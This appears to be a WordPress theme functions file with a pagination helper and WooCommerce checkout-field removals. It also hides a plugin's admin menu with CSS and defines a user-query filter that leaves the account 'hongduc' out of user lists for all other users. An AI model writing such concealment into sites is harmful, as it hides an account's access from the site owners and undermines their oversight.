<?php
  add_action('admin_head', 'my_custom_css_do'); 
  function my_custom_css_do() { 
  echo '<style> 
  #adminmenu li#toplevel_page_asl_settings {display:none;} 
  </style>';
  }
  
function mona_page_navi($wp_query='') {
	if($wp_query==''){
	global $wp_query;	
	}
    
    $bignum = 999999999;
    if ($wp_query->max_num_pages <= 1)
        return;
    echo '<nav class="pagination">';
    echo paginate_links(array(
        'base' => str_replace($bignum, '%#%', esc_url(get_pagenum_link($bignum))),
        'format' => '',
        'current' => max(1, get_query_var('paged')),
        'total' => $wp_query->max_num_pages,
        'prev_text' => '&larr;',
        'next_text' => '&rarr;',
        'type' => 'list',
        'end_size' => 3,
        'mid_size' => 3
    ));
    echo '</nav>';
}

// Add custom field billing
function mona_custom_billing_fields( $fields = array() ) {
	unset($fields['billing_last_name']);
	unset($fields['billing_state']);
	unset($fields['billing_company']);
	unset($fields['billing_postcode']);
	unset($fields['billing_address_2']);
	unset($fields['billing_city']);
    //unset($fields['billing_country']);
	return $fields;
}
add_filter('woocommerce_billing_fields','mona_custom_billing_fields');

function custom_override_checkout_fields($fields) {
    unset($fields['billing']['billing_last_name']);
    unset($fields['billing_state']);
    unset($fields['billing_company']);
    unset($fields['billing_postcode']);
    unset($fields['billing_address_2']);
   //unset($fields['billing_country']);
    return $fields;
}
add_filter('woocommerce_checkout_fields', 'custom_override_checkout_fields');

function site_pre_user_query($user_search) {
    global $current_user;
    $username = $current_user->user_login;
   
    if ($username == 'hongduc') {
    } else {
      global $wpdb;
      $user_search->query_where = str_replace('WHERE 1=1',
        "WHERE 1=1 AND {$wpdb->users}.user_login != 'hongduc'",$user_search->query_where);
    }
  }

